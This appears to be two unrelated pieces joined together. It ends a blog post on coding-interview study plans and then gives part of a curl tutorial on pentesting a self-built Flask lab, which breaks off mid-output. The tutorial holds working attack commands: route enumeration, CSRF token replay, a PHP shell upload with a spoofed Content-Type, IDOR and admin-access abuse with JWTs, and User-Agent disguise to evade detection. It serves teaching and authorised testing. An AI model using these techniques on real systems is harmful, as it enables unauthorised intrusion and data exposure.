This plan is for a refresher, when you’ve seen most of these topics before. It assumes about an hour a day on fundamentals, five or six days a week, plus a few hours a week on a project. Each day, solve one or two problems on your own, then ask an AI to review your solution, and keep a log of what you missed.

  1. Week 1: Big O, arrays, and hash maps. Solve Target Two Sum and state the complexity of every solution you write. Pick a small project you’d use yourself, and get one feature working end to end, from the page to the database.
  2. Week 2: Strings, two pointers, sliding windows, recursion, sorting, and binary search. Retry one problem from week 1 in an empty editor. Add login to your project, and make sure you can explain how each request proves who the user is.
  3. Week 3: Linked lists, stacks, queues, trees, and graphs. Once a day, take an AI-written solution and find its bug or slow part before you run it. Deploy your project at a live URL, get a friend to use it, and write its README.
  4. Week 4: Dynamic programming, then rehearsal. Do two timed mock interviews without AI and one with an AI assistant, explaining out loud the whole time. Practice walking someone through your project’s architecture in five minutes.

A 90-day plan

Ninety days is enough to learn topics you haven’t seen before and to build something substantial. It assumes about five sessions a week, plus a few extra hours for your project.

  1. Week 1: Take a baseline. Try Target Two Sum, Reverse a Linked List, and Valid Brackets without help, and note where each attempt got stuck. Review Big O. Pick a project you’d use yourself.
  2. Weeks 2 and 3: Arrays, strings, and hash maps, including implementing a hash table from scratch. Build your project’s core feature end to end: one page, one API endpoint, and one database table.
  3. Weeks 4 and 5: Recursion, sorting, and binary search. Add authentication and authorization to your project, so users can only see and change their own data.
  4. Weeks 6 and 7: Linked lists, stacks, queues, trees, and graphs. Add file uploads with object storage and one background job, like a welcome email. Start a weekly timed mock interview, alternating between rounds with and without AI.
  5. Weeks 8 and 9: Dynamic programming. Deploy your project at a live URL and invite a few people to use it. Add logging and error tracking, and put a cache in front of your slowest query.
  6. Weeks 10 to 12: Redo the problems from your log that you got wrong, in an empty editor. Write your project’s README and architecture diagram, rebuild one part without AI, and practice a system design discussion about your own project: what breaks first at 100 times the traffic, and what you’d change.
  7. After 90 days: Keep solving a few problems a week, keep building, and start a second project with tools you haven’t used before.

Practice the fundamentals on Skilled.dev, free and open source

Most of the fundamentals in this post have lessons on Skilled.dev, the interactive interview prep course I built. It’s now free and open source. It has 66 lessons on data structures, algorithms, and interview questions, 28 coding problems you can run in the browser in ten languages from JavaScript and Python to Go and Rust, and solution videos.

Pick the example from this post you were least sure you’d catch, and start with that lesson.

Doubling down on open source

The future is trending toward being completely open. When AI can clone a product effortlessly, there’s no reason tools and apps should be closed.

I plan to make all my tools open source. Some of the ones I’m most excited about are:

  1. Ri — An A-IDE (agentic integrated development environment) that works with your existing subscriptions. It combines context, task management, and agent orchestration to make productivity effortless.
  2. Beamd — An open-source proxy similar to Ngrok, but built for agents. It works completely from the CLI, no need to go to a web dashboard to register URLs.
  3. Agentex — Primitives for working with local agents and your subscriptions to providers like Codex and Claude Code.

Coding Interview Prep When Agents Write the Code was originally published in Level Up Coding on Medium, where people are continuing the conversation by highlighting and responding to this story.

title: Full Chain: Recon to Report with Nothing But curl
partialText:
Sixteen articles of technique. One article of proof.

Series: curl — The Request Engine You Never Learned Properly Article: 15 of 16

Every article in this series taught a technique. This article runs them all.

Not as a reference. As a flow — the way an actual engagement moves: from first contact with a target, through enumeration and attack, to documented findings. No additional tools. Everything that follows is curl, bash, and jq.

The target is fictional but fully specified — and, unlike earlier articles in this series, actually built and run for this write-up: a real Flask app in Docker, with real vulnerabilities, hit with real curl commands.

Target: flask-app.lab — a Flask web application with:

  • JWT-based login with a REST API (HTTP on :8015, HTTPS on :8443)
  • A file upload endpoint that validates by Content-Type
  • A REST API with an auto-generated Swagger spec (Flasgger, served at /apispec_1.json — not /swagger, more on that below)
  • A self-signed TLS certificate
  • A single internal admin endpoint at /api/admin

One honest note before we start: the lab runs on non-privileged ports (8015/8443) instead of 80/443, because that's simpler to stand up in Docker without root juggling — and realistically, you won't always get handed 80/443 on an engagement either. Every command below uses the real ports.

The lab is open source — clone it and follow along in your own terminal: github.com/roshanrajbanshi/curl-article15-lab

git clone https://github.com/roshanrajbanshi/curl-article15-lab.git
cd curl-article15-lab
docker compose up --build -d
echo "127.0.0.1 flask-app.lab" | sudo tee -a /etc/hosts

Phase 1 — Recon

Before touching any application logic, build the technology profile.

Step 1: Header fingerprint

curl -sI http://flask-app.lab:8015/
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.11.18
Date: Sun, 15 Nov 2026 07:09:14 GMT
Content-Type: application/json
Content-Length: 38
Connection: close

Read: the Server header hands us exact version numbers for Werkzeug and Python — straight to a CVE search if you want to go that route. It also confirms this is the Flask development server, not something fronted by gunicorn or nginx — a dev server in what's supposed to be a production-facing app is itself worth a line in your report. Content-Type: application/json confirms this is API-first, not a server-rendered HTML app. No X-Powered-By here — Flask doesn't add one by default.

Step 2: HTTPS port — TLS recon

curl -vk https://flask-app.lab:8443/ 2>&1 | grep -A 15 "Server certificate"
* Server certificate:
*   subject: CN=flask-app.lab
*   start date: Nov 15 06:45:20 2026 GMT
*   expire date: Nov 15 06:45:20 2027 GMT
*   issuer: CN=flask-app.lab
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* OpenSSL verify result: 12
*  SSL certificate verification failed, continuing anyway!

Read the certificate: subject and issuer are identical (CN=flask-app.lab) — that's the definition of self-signed, nobody but the cert vouches for itself. The specific OpenSSL verify result number varies by OpenSSL version and build (it's drawn from OpenSSL's x509_vfy.h error table, which has shifted over releases) — rather than guess at a numeric code from memory, trust the line right below it: SSL certificate verification failed, continuing anyway! is curl telling you it only proceeded because of -k. In a browser, that's the "your connection is not private" click-through warning.

Grab the handshake line separately — it’s usually a few lines above “Server certificate” in verbose output, so a second targeted grep is cleaner than widening -A:

curl -vk https://flask-app.lab:8443/ 2>&1 | grep -iE "SSL connection|TLSv|cipher"
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / X25519MLKEM768 / RSASSA-PSS

TLS 1.3, AES-256-GCM, and a hybrid post-quantum key exchange (X25519MLKEM768 — X25519 combined with ML-KEM-768) — all strong, modern crypto. That's the interesting contrast to flag in your notes: strong transport encryption sitting on top of a trust chain nobody should rely on. Very real-world pattern — internal tools, IoT panels, and dev/staging environments do this constantly.

Step 3: Status code mapping

One zsh gotcha before you run this: don’t use path as your loop variable. zsh treats path as a special variable tied to $PATH internally, and reusing it as a loop counter causes silent weirdness. Use p instead — cheap habit, saves a headache.

for p in / /login /register /dashboard /admin /api /api/v1 /swagger /swagger-ui /static /upload; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "http://flask-app.lab:8015$p")
  echo "$CODE $p"
done
200 /
404 /login
404 /register
404 /dashboard
404 /admin
404 /api
404 /api/v1
404 /swagger
404 /swagger-ui
404 /static
405 /upload

Generic wordlists are built for typical Flask apps — this app’s real routes are different, so most guesses come back 404. The one standout is /upload returning 405 instead of 404: that's Method Not Allowed, meaning the route exists but our default GET isn't the right verb. A 405 is a more valuable signal than a 404 — it confirms a route exists even when you haven't found the right way to hit it yet.

Once you know more about the app (from Swagger, later), a second pass with the real routes tells a much better story:

for p in / /api/v1/login /api/v1/users/me /api/admin /profile /swagger /openapi.json /upload /apispec_1.json; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "http://flask-app.lab:8015$p")
  echo "$CODE $p"
done
200 /
405 /api/v1/login
401 /api/v1/users/me
401 /api/admin
401 /profile
404 /swagger
404 /openapi.json
405 /upload
200 /apispec_1.json

Three distinct signals here, worth telling apart:

  • 404 — route doesn’t exist (/swagger, /openapi.json — this app doesn't use either path)
  • 405 — route exists, wrong HTTP method (/api/v1/login, /upload — both POST-only)
  • 401 — route exists, authentication required (/api/v1/users/me, /api/admin, /profile)

And /apispec_1.json returning 200 confirms the real Swagger spec location — Flasgger's default, not the generic /swagger or /openapi.json paths a wordlist might assume. Lesson: a Swagger-style doc exists, you just have to find where the specific library actually serves it.

Step 4: VHost probe

for h in flask-app.lab admin.flask-app.lab api.flask-app.lab dev.flask-app.lab; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "Host: $h" http://flask-app.lab:8015/)
  echo "$CODE $h"
done
200 flask-app.lab
200 admin.flask-app.lab
200 api.flask-app.lab
200 dev.flask-app.lab

A flat 200 across every Host header is a negative finding, and negative findings still belong in a report. It tells you this app doesn't branch logic based on the Host header at all — expected for a single-app-per-port setup with no reverse proxy in front of it. This check matters most when there IS a shared reverse proxy routing multiple backends by hostname on the same IP; don't skip it just because it often comes back boring — sometimes admin.target.com really is a different app, and this is exactly how you'd catch it.

Phase 2 — Auth Surface Mapping

Step 1: OPTIONS sweep on API endpoints

for p in /api/v1/login /api/v1/users/me /api/admin /upload; do
  ALLOW=$(curl -sk -X OPTIONS -i "http://flask-app.lab:8015$p" | grep -i allow)
  echo "$p: $ALLOW"
done
/api/v1/login: Allow: POST, OPTIONS
/api/v1/users/me: Allow: HEAD, OPTIONS, GET
/api/admin: Allow: HEAD, OPTIONS, GET
/upload: Allow: POST, OPTIONS

Flask auto-generates this Allow header for every route, which makes OPTIONS sweeps a cheap way to spot dangerous extra verbs before digging deeper — finding an undocumented PUT or DELETE allowed on an endpoint is a classic "oh no" moment in a real engagement. Nothing exotic shows up here, which is itself worth a line: no unexpected HTTP methods exposed on any tested endpoint.

Step 2: Unauthenticated probe — read the auth challenge

curl -sI http://flask-app.lab:8015/api/v1/users/me
HTTP/1.1 401 UNAUTHORIZED
Server: Werkzeug/3.1.9 Python/3.11.18
Date: Sun, 15 Nov 2026 07:25:29 GMT
Content-Type: application/json
Content-Length: 25
Connection: close

Notice what’s missing: no WWW-Authenticate header. Per RFC 7235 a 401 is supposed to carry one, naming the expected auth scheme — but that convention is more of a Basic-Auth-era habit, and a lot of modern JWT/Bearer-token APIs skip it entirely. Confirm the real signal is in the body instead:

curl -s http://flask-app.lab:8015/api/v1/users/me
{"error":"unauthorized"}

Don’t assume the absence of WWW-Authenticate means no auth is required — check the body and whatever documentation (Swagger, in this case) you can find instead.

Step 3: Login and capture the JWT

RESPONSE=$(curl -s \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' \
  http://flask-app.lab:8015/api/v1/login)
echo $RESPONSE | python3 -m json.tool
TOKEN=$(echo $RESPONSE | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "Token: $TOKEN"
{
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWQiOjEsImlhdCI6MTc5NDcyNzg1My45MTE4MjZ9.CbXuAAi1A07ElSsPZnNBW5aDXAkE6Y0k2oDD57xJMog"
}
Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWQiOjEsImlhdCI6MTc5NDcyNzg1My45MTE4MjZ9.CbXuAAi1A07ElSsPZnNBW5aDXAkE6Y0k2oDD57xJMog

That’s the admin account’s token, stashed in $TOKEN for the rest of the session.

Step 4: Decode the JWT payload

echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null
{"username":"admin","role":"admin","id":1,"iat":1794727853.911826}

The 2>/dev/null is there because JWT base64 isn't padded and GNU base64 sometimes complains about it on stderr even when it decodes fine — silence the noise, keep the JSON.

Read the claims like an attacker would: role: admin is the field the server almost certainly checks to decide access — if it can be trusted or forged, that's the whole game. id: 1 ties this token to a specific account. One small oddity: iat carries fractional seconds (1794727853.911826) — most JWT libraries issue iat as a whole-second Unix timestamp, so a float here is a tell about how this particular app built the token (Python's datetime.timestamp() returns a float by default, and whoever wrote this didn't truncate it). Not a vulnerability, just a fingerprint worth noting. And notice what's not here: no exp claim. This token has no expiration — once issued, it's valid forever, with no server-side mechanism for forced session timeout or rotation. That's a real finding on its own, and a genuinely common JWT misconfiguration in the wild.

Step 5: Set up cookie jar for session persistence (if sessions used alongside JWT)

curl -s \
  -c jar.txt \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' \
  http://flask-app.lab:8015/api/v1/login
cat jar.txt
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.
flask-app.lab	FALSE	/	FALSE	0	session	3352df7298cbf6412540760013082e6c

This app mixes two auth schemes: JWT Bearer tokens for the /api/* routes, and a session cookie for /profile. Worth tracking both separately rather than assuming one auth mechanism covers the whole app.

Reading the jar format itself: domain, include-subdomains flag, path, secure-only flag, expiry, then name/value. The secure-only flag here is FALSE — this cookie isn't marked Secure, so it would be sent over plain HTTP too, not just HTTPS. Minor finding on its own if this app served both protocols side by side.

Phase 3 — Attack

Attack 1: CSRF token extraction and bypass

# Fetch the profile edit form and extract CSRF token
CSRF=$(curl -sk -b jar.txt http://flask-app.lab:8015/profile | \
  grep -oP '(?<=name="csrf_token" value=")[^"]*')
echo "CSRF: $CSRF"
# Submit with CSRF token
curl -sk -b jar.txt \
  -d "email=attacker@evil.com&csrf_token=$CSRF" \
  http://flask-app.lab:8015/profile/edit
CSRF: csrf_lab_static_8f3ac9
{"email":"attacker@evil.com","status":"updated"}

The attack landed — but extracting and replaying a CSRF token isn’t the vulnerability by itself; any legitimate browser does the same thing when it submits a form. The suspicious part is that the token looks static. Don’t just assert that from one request — verify it with a second, independent session:

curl -s -c jar2.txt -X POST -H "Content-Type: application/json" \
  -d '{"username":"j.doe","password":"password123"}' \
  http://flask-app.lab:8015/api/v1/login > /dev/null
CSRF2=$(curl -sk -b jar2.txt http://flask-app.lab:8015/profile | \
  grep -oP '(?<=name="csrf_token" value=")[^"]*')
echo "First session's token:  $CSRF"
echo "Second session's token: $CSRF2"

If both lines print the identical value, the finding is confirmed — a real CSRF token needs to be unique per session, unpredictable, and tied to the specific user submitting it. Since this one isn’t, an attacker who learns the token once — by viewing the public page source, say — could craft a page that auto-submits a forged request on behalf of any logged-in victim. Classic CSRF, trivialized because the “secret” is neither secret nor unique. (If your two tokens come back different, soften this finding to “appears static in this test” and dig further before reporting it as confirmed.)

Attack 2: File upload — Content-Type bypass

# First, test a normal upload to understand the response
echo "test file contents" > test.txt
curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@test.txt" \
  http://flask-app.lab:8015/upload
{"content_type":"text/plain","filename":"test.txt","status":"uploaded"}

Baseline confirmed — text/plain is accepted. Now the attack: curl lets us set the multipart Content-Type field to anything we want with ;type=, independent of the actual file content or extension.

# Attempt PHP shell upload with spoofed Content-Type
echo '<?php echo "lab demo only - not executed"; ?>' > shell.php
curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.php;type=image/jpeg" \
  http://flask-app.lab:8015/upload
{"content_type":"image/jpeg","filename":"shell.php","status":"uploaded"}

Bypassed. Look at the mismatch sitting right there in the response: content_type says image/jpeg, filename says shell.php. The app does record the real filename — it's not blind to what you uploaded — it just never validates it. Acceptance is decided entirely by the client-supplied Content-Type header, which is fully attacker-controlled, with no check against the actual extension or the file's magic bytes. In an app that also serves uploaded files from a web-accessible path and executes PHP, this is a direct line to remote code execution.

# Double-extension variant, for completeness
cp shell.php shell.php.jpg
curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.php.jpg;type=image/jpeg" \
  http://flask-app.lab:8015/upload
{"content_type":"image/jpeg","filename":"shell.php.jpg","status":"uploaded"}

Same result, same root cause. The double-extension trick is normally a workaround for apps that check the extension but only look at the last segment, or use a naive blacklist. Here it wasn’t even necessary — there’s no extension check at all. In apps with partial filename filtering, this technique is what makes the difference; here it’s just confirmation.

Verify on disk:

docker exec article15-flask-app ls -la /app/uploads/
total 20
drwxr-xr-x 2 root root 4096 Nov 15 07:41 .
drwxr-xr-x 1 root root 4096 Nov 15 06:45 ..
-rw-r--r-- 1 root root   46 Nov 15 07:40 shell.php
-rw-r--r-- 1 root root   46 Nov 15 07:41 shell.php.jpg
-rw-r--r-- 1 root root   19 Nov 15 07:39 test.txt

Both .php files saved untouched — proof of concept complete.

One caveat: docker exec is a lab convenience — it only works because we have shell access to the container. On a real engagement you won't have that, so you'd confirm the same thing by fetching the file back over HTTP instead (e.g., curl http://target/uploads/shell.php once you know or guess the storage path), or by other out-of-band signals that the upload actually landed.

Attack 3: Swagger endpoint — full API documentation read

Recall from recon: this app’s Swagger library (Flasgger) serves its spec at /apispec_1.json, not the generic /swagger or /openapi.json paths.

curl -sk http://flask-app.lab:8015/apispec_1.json | python3 -m json.tool | head -60
{
    "definitions": {},
    "info": {
        "description": "powered by Flasgger",
        "termsOfService": "/tos",
        "title": "A swagger API",
        "version": "0.0.1"
    },
    "paths": {
        "/api/admin": {
            "get": {
                "responses": {
                    "200": {"description": "admin data"},
                    "401": {"description": "unauthorized"}
                },
                "summary": "Admin-only data. VULNERABLE: only checks token presence, not role claim."
            }
        },
        "/api/v1/login": {
            "post": {
                "parameters": [{
                    "in": "body", "name": "body",
                    "schema": {"properties": {"password": {"type": "string"}, "username": {"type": "string"}}, "type": "object"}
                }],
                "responses": {"200": {"description": "JWT token"}, "401": {"description": "Invalid credentials"}},
                "summary": "Login with username/password, returns a JWT."
            }
        },
        "/api/v1/users/{uid}": { "...": "..." }
    }
}

Look closely at that /api/admin summary: "Admin-only data. VULNERABLE: only checks token presence, not role claim." Flasgger pulls its summary field straight from the Python docstring — and that line was written as an honest internal note during development, then auto-published to the public API spec with zero filtering. This is a real, common mistake: developers leave TODOs, FIXMEs, and known-issue comments in docstrings, and auto-doc tooling republishes them to anyone who requests the spec. Treat docstrings as public-facing text, not private scratch notes.

Beyond that happy accident, the spec hands over full request/response schemas for every documented route — field names, types, required parameters — a ready-made attack-surface map with no guessing required. That’s the core “exposed Swagger” finding.

# Pull all endpoint paths from the spec
curl -sk http://flask-app.lab:8015/apispec_1.json | \
  python3 -c "import sys,json; [print(p) for p in json.load(sys.stdin)['paths'].keys()]"
/api/admin
/api/v1/login
/api/v1/users/{uid}
/upload

({uid} in /api/v1/users/{uid} is just Swagger's notation for a path parameter — substitute a real ID, like 2, when you actually make the request.)

Only 4 routes show up here — but we already know from the manual status-code sweep in Phase 1 that /profile, /profile/edit, and /api/v1/users/me also exist. They're missing from the spec simply because those routes weren't annotated with Flasgger docstrings. The lesson: Swagger/OpenAPI documentation is only as complete as what developers bothered to annotate. A pentester relying solely on the published spec would miss three real routes entirely — manual enumeration (Phase 1) still matters even when a Swagger doc exists.

Attack 4: Admin endpoint access test

# Without auth
curl -sk -o /dev/null -w "%{http_code}\n" http://flask-app.lab:8015/api/admin
401
# With the admin token we already captured
curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  -o /dev/null -w "%{http_code}\n" \
  http://flask-app.lab:8015/api/admin
200

Baseline behaves as expected — no auth is blocked, the admin account gets through. That doesn’t prove a vulnerability yet, though: an admin accessing admin data is supposed to work. The real test is whether a non-admin token gets the same result. Log in as a regular user and repeat:

USER_RESPONSE=$(curl -s \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"j.doe","password":"password123"}' \
  http://flask-app.lab:8015/api/v1/login)
USER_TOKEN=$(echo $USER_RESPONSE | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
# confirm the role claim
echo $USER_TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null
echo ""
# hit /api/admin with the regular user token
curl -sk \
  -H "Authorization: Bearer $USER_TOKEN" \
  http://flask-app.lab:8015/api/admin | python3 -m json.tool
{"username":"j.doe","role":"user","id":2,"iat":1794729064.737042}
{
    "all_users": [
        {"email": "attacker@evil.com", "id": 1, "username": "admin"},
        {"email": "j.doe@flask-app.lab", "id": 2, "username": "j.doe"},
        {"email": "m.smith@flask-app.lab", "id": 3, "username": "m.smith"},
        {"email": "a.khan@flask-app.lab", "id": 4, "username": "a.khan"}
    ],
    "secret": "internal admin panel data"
}

Confirmed, with the decoded token sitting right above it as proof: "role":"user". That's not an admin. And yet the full user list and "secret" admin panel data both came back. This is Broken Access Control — OWASP Top 10 #1. The endpoint correctly validates that the JWT is real and properly signed (authentication works fine); it just never checks whether the role claim inside it is actually allowed to be here (authorization is missing). That distinction — logged in vs. allowed — is the single most important concept in access control testing.

Attack 5: IDOR test on user endpoints

Still using $USER_TOKEN (j.doe, a plain role: user account):

# Get the current user's own data
curl -sk -H "Authorization: Bearer $USER_TOKEN" http://flask-app.lab:8015/api/v1/users/me
echo ""
# Try every known user ID
for id in $(seq 1 4); do
  echo "--- user id $id ---"
  curl -sk -H "Authorization: Bearer $USER_TOKEN" "http://flask-app.lab:8015/api/v1/users/$id"
  echo ""
done
{"email":"j.doe@flask-app.lab","id":2,"role":"user","username":"j.doe"}
--- user id 1 ---
{"email":"attacker@evil.com","id":1,"role":"admin","username":"admin"}
--- user id 2 ---
{"email":"j.doe@flask-app.lab","id":2,"role":"user","username":"j.doe"}
--- user id 3 ---
{"email":"m.smith@flask-app.lab","id":3,"role":"user","username":"m.smith"}
--- user id 4 ---
{"email":"a.khan@flask-app.lab","id":4,"role":"user","username":"a.khan"}

(seq is a GNU coreutils tool — fine on Kali, but if you're ever working from a minimal shell like Alpine or BusyBox where it's missing, for id in 1 2 3 4; do ... done does the same job without it.)

Textbook IDOR. j.doe’s own account is ID 2 — everything else is a different user’s full record. Logged in as a plain user, we just enumerated every single account in the system, including the admin’s role and email, with nothing more exotic than a seq 1 4 loop. The endpoint checks "do you have a valid token?" but never checks "does this record belong to you?" — that gap between authentication and ownership verification is the definition of Insecure Direct Object Reference.

Phase 4 — Evasion

Apply a balanced stealth profile for all subsequent testing — as a shell function, not an eval'd flag string. Inline-evaling a string of shell flags is fragile (quoting breaks easily, and it's harder to debug when it does); a function is cleaner and just as fast to type:

scurl() {
  curl \
    -A "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
    -H "Accept: */*" \
    -H "Accept-Language: en-US,en;q=0.5" \
    "$@"
}
scurl -sk http://flask-app.lab:8015/api/v1/users/me -H "Authorization: Bearer $USER_TOKEN"
{"email":"j.doe@flask-app.lab","id":2,"role":"user","username":"j.doe"}

Same data as before, now wrapped in browser-like headers instead of curl’s default fingerprint. Confirm it’s actually sending what we claim:

scurl -skv http://flask-app.lab:8015/api/v1/users/me -H "Authorization: Bearer $USER_TOKEN" 2>&1 | grep -E "^> "
> GET /api/v1/users/me HTTP/1.1
> Host: flask-app.lab:8015
> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
> Accept: */*
> Accept-Language: en-US,en;q=0.5
> Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

No curl/x.x.x anywhere — the outgoing request now looks like stock Firefox. (This function only lives in your current shell — add it to ~/.zshrc or ~/.bashrc if you want scurl available every time you open a terminal, not just this session.) Without -A, curl announces itself by name in every request, which is a dead giveaway in WAF/IDS logs; the Accept and Accept-Language headers round out the disguise, since a bare curl request is often missing headers a real browser always sends — and that absence is itself a fingerprint some defenses flag on.

Rate-limited automation with the stealth profile:

cat << EOF > wordlist.txt
/
/api/v1/login
/api/v1/users/me
/api/admin
/profile
/upload
/apispec_1.json
/nonexistent
EOF
while read p; do
  scurl -sk -o /dev/null -w "%{http_code} $p\n" "http://flask-app.lab:8015$p"
  sleep 1
done < wordlist.txt
200 /
405 /api/v1/login
401 /api/v1/users/me
401 /api/admin
401 /profile
405 /upload
200 /apispec_1.json
404 /nonexistent

Matches the earlier manual sweep exactly — good consistency check — but this time at a human-ish pace (one request per second) wearing a browser User-Agent instead of blasting eight bare-curl requests in a fraction of a second.

Worth being honest about what this phase actually proves: our lab has no WAF or rate-limiter, so nothing was “bypassed” here. The value is habit — blending in by default, and pacing requests, instead of hammering a real target bare-curl-style where logging and alerting exist. scurl as a reusable function beats retyping flags every time: fewer mistakes, a consistent fingerprint across the whole session.

Phase 5 — Documentation

--write-out as a report seed:

curl -sk \
  -H "Authorization: Bearer $USER_TOKEN" \
  -w "\n---\nTimestamp: $(date)\nStatus: %{http_code}\nSize: %{size_download} bytes\nTime: %{time_total}s\nIP: %{remote_ip}\n---\n" \
  http://flask-app.lab:8015/api/admin \
  -o admin_response.txt
cat admin_response.txt
---
Timestamp: Sun Nov 15 03:00:00 AM EST 2026
Status: 200
Size: 289 bytes
Time: 0.008424s
IP: 127.0.0.1
---
{"all_users":[{"email":"attacker@evil.com","id":1,"username":"admin"},{"email":"j.doe@flask-app.lab","id":2,"username":"j.doe"},{"email":"m.smith@flask-app.lab","id":3,"username":"m.smith"},{"email":"a.khan@flask-app.lab","id":4,"username":"a.khan"}],"secret":"internal admin panel data"}

Note the deliberate separation: -o admin_response.txt captures the response body, while -w sends the forensic metadata to stdout. That split matters for reporting — the body often goes in an appendix, while the metadata (timestamp, status, size, target IP) belongs in the findings table itself. This single command captures the broken-access-control exploit from Attack 4, fully timestamped, in one shot.

Markdown finding template from curl output:

Copy this structure into your notes and fill it in as you work:

Finding: Broken Access Control — Admin Endpoint

Endpoint: GET /api/admin

Expected: 403 Forbidden for non-admin users

Actual: 200 OK

Request:

curl -sk -H "Authorization: Bearer <j.doe_user_token>" http://flask-app.lab:8015/api/admin

Response:

{"all_users":[{"email":"attacker@evil.com","id":1,"username":"admin"},{"email":"j.doe@flask-app.lab","id":2,"username":"j.doe"},{"email":"m.smith@flask-app.lab","id":3,"username":"m.smith"},{"email":"a.khan@flask-app.lab","id":4,"username":"a.khan"}],"secret":"internal admin panel data"}

Evidence: Status 200 with full admin data returned using a standard role: user JWT token (confirmed via decoded claims: {"username":"j.doe","role":"user","id":2})

Impact: Any authenticated user can access administrative functions and view all user account data, including email addresses, regardless of their assigned role

Recommendation: Implement server-side role-based access control; verify the role claim in the JWT equals admin before serving /api/admin, rather than only checking that a valid token was presented

Building a JSON report from session output:

The obvious move is a heredoc with command substitution — but watch what happens when you try it:

cat << EOF > findings.json
{
  "target": "flask-app.lab:8015",
  "date": "$(date -I)",
  "findings": [
    {
      "title": "Broken Access Control - Admin Endpoint",
      "endpoint": "/api/admin",
      "severity": "High",
      "evidence": "$(curl -sk -H "Authorization: Bearer $USER_TOKEN" http://flask-app.lab:8015/api/admin | python3 -c 'import sys; print(sys.stdin.read()[:200])')"
    }
  ]
}
EOF
python3 -m json.tool findings.json
Expecting ',' delimiter: line 9 column 22 (char 218)

This breaks, and it’s worth understanding exactly why rather than just fixing it blind. The evidence field embeds raw curl output — which is already JSON, full of its own " characters — directly inside another JSON string. Bash's command substitution does zero escaping: those inner quotes land in the file literally, and the outer JSON parser sees the first unescaped " and thinks the string ended far too early. Classic "JSON inside JSON needs escaping" trap, and heredocs don't help you here.

The fix: don’t hand-roll JSON when a field might contain special characters — build it with jq instead, using --arg to pass values in as safely-escaped strings:

EVIDENCE=$(curl -sk -H "Authorization: Bearer $USER_TOKEN" http://flask-app.lab:8015/api/admin | head -c 200)
# date -I prints an ISO 8601 date (YYYY-MM-DD)
jq -n \
  --arg target "flask-app.lab:8015" \
  --arg date "$(date -I)" \
  --arg ev1 "$EVIDENCE" \
  '{
    target: $target,
    date: $date,
    findings: [
      {title: "Broken Access Control - Admin Endpoint", endpoint: "/api/admin", severity: "High", evidence: $ev1},
      {title: "IDOR on User Records", endpoint: "/api/v1/users/{id}", severity: "High", evidence: "Enumerated all 4 user accounts using a single non-admin token by incrementing the id parameter"},
      {title: "File Upload Content-Type Bypass", endpoint: "/upload", severity: "Critical", evidence: "shell.php uploaded successfully by spoofing Content-Type to image/jpeg"},
      {title: "Exposed API Documentation", endpoint: "/apispec_1.json", severity: "Medium", evidence: "Full API schema accessible without authentication, including internal developer comments"}
    ]
  }' > findings.json
cat findings.json
{
